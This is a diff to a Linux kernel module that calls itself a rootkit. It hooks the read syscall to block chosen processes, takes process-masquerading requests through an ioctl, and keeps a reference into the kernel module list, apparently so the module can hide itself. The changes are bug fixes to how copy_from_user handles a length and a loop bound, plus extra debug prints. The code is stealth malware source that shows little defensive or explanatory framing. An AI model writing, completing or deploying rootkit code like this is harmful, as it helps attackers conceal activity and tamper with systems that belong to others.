@@ -40,12 +40,12 @@ MODULE_LICENSE("Dual MIT/GPL");
 MODULE_VERSION("0.1");
 
 static asmlinkage long my_sys_read(const struct pt_regs *regs) {
-  printk(KERN_WARNING "my_sys_read\n");
+  pr_warn("my_sys_read\n");
   struct filter_info *pos;
   list_for_each_entry(pos, &filter_list.list, list) {
     if (strcmp(pos->comm, current->comm) == 0 && pos->syscall_nr == __NR_read) {
       pr_info("Filtering read syscall for process %s\n", pos->comm);
-      return -1;
+      return ERRFILTER;
     }
   }
 
@@ -105,13 +105,17 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
     if (module_list == NULL)
       module_list = THIS_MODULE->list.prev;
     struct masq_proc_req *req = (struct masq_proc_req *)kmalloc(
-                             sizeof(struct masq_proc_req), GFP_KERNEL),
-                         *usr_req = (struct masq_proc_req *)arg;
+        sizeof(struct masq_proc_req), GFP_KERNEL);
+    struct masq_proc_req *usr_req = (struct masq_proc_req *)arg;
+
     req->list = (struct masq_proc *)kmalloc(
         sizeof(struct masq_proc) * usr_req->len, GFP_KERNEL);
-    copy_from_user(req->len, &usr_req->len, sizeof(size_t));
+    pr_warn("addrs: %p %p\n", &req->len, &usr_req->len);
+
+    copy_from_user(&req->len, &usr_req->len, sizeof(size_t));
     pr_warn("copy_from_user done with len=%d\n", req->len);
-    for (int i = 0; i < usr_req->len; i++) {
+
+    for (int i = 0; i < req->len; i++) {
       struct masq_proc *entry = &usr_req->list[i];
       copy_from_user(&req->list[i], entry, sizeof(struct masq_proc));
       printk(KERN_WARNING "copy_from_user done with entry %d\n", i);
